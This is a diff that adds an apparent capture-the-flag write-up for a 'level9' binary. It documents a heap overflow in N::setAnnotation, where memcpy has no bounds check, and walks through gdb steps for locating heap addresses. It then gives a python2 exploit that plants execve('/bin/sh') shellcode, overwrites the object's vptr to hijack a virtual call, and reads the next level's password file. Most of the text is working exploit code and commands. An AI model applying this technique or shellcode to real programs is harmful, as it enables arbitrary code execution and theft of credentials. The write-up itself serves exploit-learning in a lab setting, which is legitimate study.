@@ -1,1 +1,50 @@
-TODO: Document the step-by-step exploitation process, commands, and reasoning.
+Goal: overwrite `b->vptr` via heap overflow and redirect the virtual call to shellcode.
+
+Observation:
+- `N::setAnnotation()` uses `memcpy` with `strlen` and no bounds check.
+- `N` objects are 0x6c bytes; `annotation` starts at offset 0x04.
+- The virtual call is `(*b->vptr[0])(b, a)`.
+- The stack is executable (`GNU_STACK` is RWE), so shellcode can run.
+
+Steps:
+1) Confirm executable stack:
+	readelf -W -l /home/user/level9/level9 | grep GNU_STACK
+2) Get heap addresses for `n1` and `n2`:
+	gdb -q /home/user/level9/level9
+	(gdb) b *0x8048677
+	(gdb) run AAAA
+	(gdb) x/wx $esp+0x14   # n1
+	(gdb) x/wx $esp+0x10   # n2
+3) Compute addresses:
+	annotation = n1 + 0x04
+	overwrite offset = (n2 - annotation) = 0x6c (108 bytes)
+4) Build payload:
+	- fake vtable entry (shellcode address)
+	- shellcode bytes
+	- padding to 0x6c
+	- overwrite `b->vptr` with annotation address
+5) Run:
+	/home/user/level9/level9 "$(python2 - <<'PY'
+	import struct, sys
+	n1 = 0x0804a008  # replace with runtime value
+	annotation = n1 + 4
+	shell_addr = annotation + 4
+
+	shellcode = (
+		 "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+		 "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+		 "\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+	)
+
+	payload  = struct.pack("<I", shell_addr)
+	payload += shellcode
+	payload += "A" * (0x6c - len(payload))
+	payload += struct.pack("<I", annotation)
+	sys.stdout.write(payload)
+	PY
+	)"
+6) In the spawned shell:
+	cat /home/user/bonus0/.pass
+
+Result:
+- The command prints the bonus0 password, stored in the flag file.
